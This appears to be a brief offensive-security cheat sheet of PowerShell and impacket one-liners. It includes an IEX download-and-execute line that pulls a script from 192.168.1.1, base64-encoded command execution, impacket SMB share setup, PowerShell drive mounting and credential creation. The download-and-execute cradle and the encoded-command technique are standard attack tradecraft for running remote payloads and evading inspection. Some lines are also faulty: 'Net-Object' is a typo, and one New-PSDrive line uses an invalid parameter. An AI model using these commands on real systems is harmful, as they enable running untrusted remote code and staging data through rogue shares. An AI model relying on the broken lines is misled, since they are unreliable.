### Download and execute ps1

```
IEX(New-Object Net.WebClient).downloadString('http://192.168.1.1/blah.ps1')
```

### Execute command from base64

https://stackoverflow.com/questions/37996640/how-can-i-base64-encode-a-string-on-linux-so-it-matches-windows-unicode-getbyte

First convert your payload to utf16 little endian
```
echo test | iconv -t UTF-16LE
```

```
powershell -EncodedCommand <base64>
```

### Create smb share:

From impacket:
```
impacket-smbserver -username username -password password shareName shareDirectory -smb2support
```

From powershell:

```
New-PSDrive -name username -password password \\ip\shareName -Credential $cred -PSProvider "filesystem"
```

### Create credential

```
$pass = "password" | ConvertTo-SecureString -AsPlainText -Force
$cred = Net-Object System.Management.Automation.PsCredential('username', $pass)
```

### CD into share

```
cd \\<ip>\<share>
```
